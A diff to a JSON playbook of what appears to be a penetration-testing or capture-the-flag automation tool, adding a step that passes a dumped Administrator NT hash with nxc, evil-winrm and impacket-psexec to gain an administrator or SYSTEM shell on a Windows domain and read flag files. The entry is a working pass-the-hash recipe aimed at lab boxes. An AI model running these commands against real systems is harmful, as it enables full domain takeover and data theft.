@@ -1075,6 +1075,59 @@
    ]
   },
   {
+   "id": "own-domain-pth",
+   "title": "Own the Domain — Pass-the-Hash as Administrator",
+   "hypothesis": "A completed DCSync / NTDS dump handed you every domain hash, the built-in Administrator (RID 500) among them. There is nothing left to crack: pass that NT hash straight into a login and you ARE Domain Administrator. Confirm it, take an interactive shell, and read the flags — this is the box.",
+   "tool": "evil-winrm",
+   "tools": [
+    "evil-winrm",
+    "impacket-psexec",
+    "impacket-wmiexec",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "phase": "loot",
+   "requires_all": [
+    "loot.ntds"
+   ],
+   "requires_any": [],
+   "produces": [
+    "access.admin"
+   ],
+   "autonomy": "approve",
+   "priority": 99,
+   "proves": "domain compromise — an interactive session as the built-in Administrator via pass-the-hash",
+   "does_not_prove": "",
+   "report": {
+    "finding": "Full Domain Compromise (Pass-the-Hash as Administrator)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/Hackplayers/evil-winrm",
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u administrator -H {{nthash}}",
+     "note": "Confirm the dumped Administrator NT hash authenticates — expect (Pwn3d!). Select the Administrator credential (the one obol pulled from your NTDS dump) on the left so {{nthash}} fills; -H passes the hash, no password needed."
+    },
+    {
+     "tool": "evil-winrm",
+     "run": "evil-winrm -i {{target}} -u administrator -H {{nthash}}",
+     "win": true,
+     "note": "Interactive shell as Administrator over WinRM — pure pass-the-hash, no plaintext. Then read the flags: type C:\\Users\\Administrator\\Desktop\\root.txt and the user's Desktop for user.txt. If 5985/WinRM is closed, use the psexec/wmiexec variants below."
+    },
+    {
+     "tool": "impacket-psexec",
+     "run": "impacket-psexec -hashes ':{{nthash}}' administrator@{{target}}",
+     "note": "SYSTEM shell via pass-the-hash when WinRM is closed. -hashes ':NT' (empty LM half). impacket-wmiexec with the same -hashes is the quieter, semi-interactive alternative."
+    }
+   ]
+  },
+  {
    "id": "lateral-exec",
    "title": "Authenticated Remote Execution",
    "hypothesis": "Valid credentials carrying local admin rights get you code execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM through evil-winrm (a full shell on port 5985). Even with just an NTLM hash, pass-the-hash behaves the same way — you seldom need the plaintext.",
@@ -2320,6 +2373,9 @@
    "requires_any": [
     "ad.dc_candidate",
     "credential.available"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "ad.coerced_auth",
